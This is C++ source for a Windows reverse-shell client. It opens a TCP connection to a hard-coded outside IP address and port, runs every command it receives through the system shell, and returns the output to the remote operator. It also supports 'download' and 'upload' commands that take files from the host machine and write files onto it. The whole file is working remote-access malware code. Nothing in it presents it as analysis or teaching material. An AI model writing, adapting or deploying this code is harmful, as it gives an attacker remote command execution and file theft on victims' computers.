#include <fstream>
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <direct.h>
#include <algorithm>
#include <tuple>

#pragma comment (lib, "ws2_32.lib")

using namespace std;


std::tuple<string, string> execute(const std::string& command) {

	if (command.find("cd ", 0) == 0) {
		string cd = command;
		cd.erase(0, 3);
		cout << "cd \n" << cd;
		_chdir(cd.c_str());
		return make_tuple("cd \n", "");
	}



	else {
		char* buf = nullptr;
		size_t sz = 0;
		_dupenv_s(&buf, &sz, "TMP");


		system((command + " 1> %temp%/temp 2> %temp%/temp2").c_str());


		string loc = string(buf) + "/temp";
		std::ifstream ifs(loc);
		std::string ret{ std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>() };
		ifs.close(); // must close the inout stream so the file can be cleaned up
		if (std::remove(loc.c_str()) != 0) {
			perror("Error deleting temp1orary file");
		}
		loc = string(buf) + "/temp2";
		std::ifstream ifs2(loc);
		std::string ret2{ std::istreambuf_iterator<char>(ifs2), std::istreambuf_iterator<char>() };
		ifs2.close(); // must close the inout stream so the file can be cleaned up
		if (std::remove(loc.c_str()) != 0) {
			perror("Error deleting temp1orary file");
		}
		return make_tuple(ret, ret2);
	}
}

bool senddata(SOCKET sock, void* buf, int buflen)
{
	const char* pbuf = (const char*)buf;

	while (buflen > 0)
	{
		int num = send(sock, pbuf, buflen, 0);
		if (num == SOCKET_ERROR)
		{
			if (WSAGetLastError() == WSAEWOULDBLOCK)
			{
				// optional: use select() to check for timeout to fail the send
				continue;
			}
			return false;
		}

		pbuf += num;
		buflen -= num;
	}

	return true;
}

bool sendlong(SOCKET sock, long value)
{
	value = htonl(value);
	return senddata(sock, &value, sizeof(value));
}

bool sendfile(SOCKET sock, FILE* f)
{
	fseek(f, 0, SEEK_END);
	long filesize = ftell(f);
	rewind(f);
	if (filesize == EOF)
		return false;
	if (!sendlong(sock, filesize))
		return false;
	if (filesize > 0)
	{
		char buffer[1024];
		do
		{
			size_t num = min(filesize, sizeof(buffer));
			num = fread(buffer, 1, num, f);
			if (num < 1)
				return false;
			if (!senddata(sock, buffer, num))
				return false;
			filesize -= num;
		} while (filesize > 0);
	}
	return true;
}

void send_file(int sock, const char* filename) {

	cout << "Inside" << "\n";

	// setting the variables
	FILE* fp;


	cout << "Opening the file" << "\n";

	// opening the file
	fopen_s(&fp, filename, "rb");


	cout << "Starting the loop" << "\n";

	int n;
	char data[1024] = { 0 };

	while (fgets(data, 1024, fp) != NULL) {
		cout << "Sending " << data << "\n";
		send(sock, data, sizeof(data), 0);

		ZeroMemory(data, 1024);
	}
	string lol = "sentt cOmpl3t3";
	const char* lol2 = lol.c_str();
	send(sock, lol2, 15, 0);


}


void write_file(int sock, const char* filename) {
	int n;
	FILE* fp;

	char buffer[1024];

	cout << "started file transfer";

	fopen_s(&fp, filename, "wb");
	while (1) {
		recv(sock, buffer, 1024, 0);

		if (string(buffer) == "sentt cOmpl3t3") {

			break;

		}
		fprintf(fp, "%s", buffer);
		ZeroMemory(buffer, 1024);
	}
	fclose(fp);
	return;
}

bool readdata(SOCKET sock, void* buf, int buflen)
{
	char* pbuf = (char*)buf;

	while (buflen > 0)
	{
		int num = recv(sock, pbuf, buflen, 0);
		if (num == SOCKET_ERROR)
		{
			if (WSAGetLastError() == WSAEWOULDBLOCK)
			{
				// optional: use select() to check for timeout to fail the read
				continue;
			}
			return false;
		}
		else if (num == 0)
			return false;

		pbuf += num;
		buflen -= num;
	}

	return true;
}

bool readlong(SOCKET sock, long* value)
{
	if (!readdata(sock, value, sizeof(value)))
		return false;
	*value = ntohl(*value);
	return true;
}

bool readfile(SOCKET sock, FILE* f)
{
	long filesize;
	if (!readlong(sock, &filesize))
		return false;
	if (filesize > 0)
	{
		char buffer[1024];
		do
		{
			int num = min(filesize, sizeof(buffer));
			if (!readdata(sock, buffer, num))
				return false;
			int offset = 0;
			do
			{
				size_t written = fwrite(&buffer[offset], 1, num - offset, f);
				if (written < 1)
					return false;
				offset += written;
			} while (offset < num);
			filesize -= num;
		} while (filesize > 0);
	}
	return true;
}


int main()
{
	cout << "Hello World!\n";


	/*string ip = "193.161.193.99";
	int port = 44313;*/

	string ip = "3.1.5.104";
	int port = 4422;

	int buffer = 256;


	// initialze winsock

	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	int wsOk = WSAStartup(ver, &wsData);

	if (wsOk != 0) {
		cerr << "Cant initilize winsock, quitting" << endl;
		return 1;
	}

	// create a socket

	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

	if (sock == INVALID_SOCKET) {
		cerr << "Cant create socket, quitting" << endl;
		WSACleanup();
		return 1;
	}

	// bind socket

	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);

	// connect to server

	int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
	if (connResult == SOCKET_ERROR) {
		cerr << "Cant connect to server, Err #" << WSAGetLastError() << endl;
		closesocket(sock);
		WSACleanup();
		return 1;
	}




	// while loop: accpet and echo message back to client

	char buf[100];
	char buf2[409600];
	int i;
	while (true) {

		int bytesRecv = recv(sock, buf, 100, 0);



		int buf_size = sizeof(buf) / sizeof(char);


		string cmd = string(buf);

		if (cmd.find("download ", 0) == 0) {
			char buf3[4] = "ok";
			char filename_buf[1024];
			send(sock, buf3, 4, 0);
			recv(sock, filename_buf, 1024, 0);

			FILE* filehandle;
			fopen_s(&filehandle, filename_buf, "rb");
			if (filehandle != NULL)
			{
				sendfile(sock, filehandle);
				fclose(filehandle);
			}


			/*	cout << "ready to send file";
				send_file(sock, filename_buf);*/
		}

		else if (cmd.find("upload ", 0) == 0) {
			cmd.erase(cmd.find("upload "), 7);

			recv(sock, buf2, 4, 0);
			ZeroMemory(buf2, 4);
			send(sock, cmd.c_str(), 1024, 0);

			FILE* filehandle;
			fopen_s(&filehandle, cmd.c_str(), "wb");
			if (filehandle != NULL)
			{
				bool ok = readfile(sock, filehandle);
				fclose(filehandle);


			}
		}
	
		else {
			string output;
			if (cmd == "name") {

				TCHAR szFileName[MAX_PATH];
				GetModuleFileName(NULL, szFileName, MAX_PATH);
			
				cout << szFileName << "\n";
			}

			else{
		
				string stdout1;
				string stderr1;
				tie(stdout1, stderr1) = execute(cmd);
				string output2 = stdout1 + stderr1;

				string pwdout;
				string pwderr;
				tie(pwdout, pwderr) = execute("cd");
				string pwd = pwdout + pwderr;
				pwd = pwd.substr(0, pwd.size() - 1);

				output = output2 + "\n" + pwd + "--> ";
		
			}

			char tab2[409600];
			strncpy_s(tab2, output.c_str(), sizeof(tab2));
			tab2[sizeof(tab2) - 1] = 0;

			i = output.length();
			cout << i;
			char converted_number[8];

			sprintf_s(converted_number, "%d", i);


			send(sock, converted_number, 8, 0);

			char temp_buf[8];
			recv(sock, temp_buf, 8, 0);

			send(sock, tab2, i + 1, 0);
		}
	}

	// close socket

	closesocket(sock);

	// cleanup winsock

	WSACleanup();
}
